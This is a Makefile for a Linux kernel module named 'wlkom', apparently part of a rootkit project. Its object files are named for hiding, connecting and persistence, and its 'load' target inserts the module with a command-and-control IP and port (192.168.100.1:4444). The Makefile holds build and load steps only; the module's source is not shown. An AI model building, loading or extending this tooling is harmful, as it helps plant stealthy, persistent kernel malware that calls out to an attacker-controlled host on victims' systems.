obj-m += wlkom.o

wlkom-objs := main.o hide.o connect.o persist.o

ccflags-y := -Wno-declaration-after-statement \
	         -Wno-error=incompatible-pointer-types \
	         -Wno-incompatible-pointer-types

ccflags-y += -DCONFIG_X86_64

KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

C2_IP   ?= 192.168.100.1
C2_PORT ?= 4444

all:
	@if [ ! -d "$(KDIR)" ]; then \
	    echo "ERROR: Kernel headers not found at $(KDIR)"; \
	    echo "Arch:   sudo pacman -S linux-headers"; \
	    echo "Debian: sudo apt install linux-headers-$$(uname -r)"; \
	    exit 1; \
	fi
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	sudo insmod wlkom.ko c2_ip="$(C2_IP)" c2_port=$(C2_PORT)

unload:
	sudo rmmod wlkom

.PHONY: all clean load unload
